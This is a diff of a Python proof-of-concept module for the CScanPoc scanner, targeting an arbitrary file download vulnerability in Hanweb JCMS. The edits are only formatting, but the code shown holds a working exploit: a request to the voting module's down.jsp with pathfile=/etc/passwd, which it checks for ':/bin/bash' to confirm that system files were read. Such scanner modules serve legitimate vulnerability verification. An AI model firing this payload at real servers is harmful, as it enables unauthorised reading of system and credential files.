@@ -3,6 +3,7 @@
 from CScanPoc.thirdparty import requests
 from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
 
+
 class Vuln(ABVuln):
     vuln_id = 'JCMS_0003'  # 平台漏洞编号，留空
     name = '大汉JCMS 任意文件下载'  # 漏洞名称
@@ -18,6 +19,7 @@ class Vuln(ABVuln):
     product = 'Hanweb(大汉)'  # 漏洞应用名称
     product_version = 'Unknown'  # 漏洞应用版本
 
+
 class Poc(ABPoc):
     poc_id = 'dbfe99d7-8acd-4fdd-b669-83c9a88c20db'
     author = '47bwy'  # POC编写者
@@ -31,7 +33,8 @@ class Poc(ABPoc):
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
 
-            verify_url = ('%s/jcms/m_5_e/module/voting/down.jsp?filename=a.txt&pathfile=/etc/passwd') % self.target
+            verify_url = (
+                '%s/jcms/m_5_e/module/voting/down.jsp?filename=a.txt&pathfile=/etc/passwd') % self.target
 
             req = requests.get(verify_url)
             if req.status_code == 200 and ":/bin/bash" in req.content:
@@ -43,6 +46,7 @@ class Poc(ABPoc):
 
     def exploit(self):
         self.verify()
+
 
 if __name__ == '__main__':
     Poc().run()
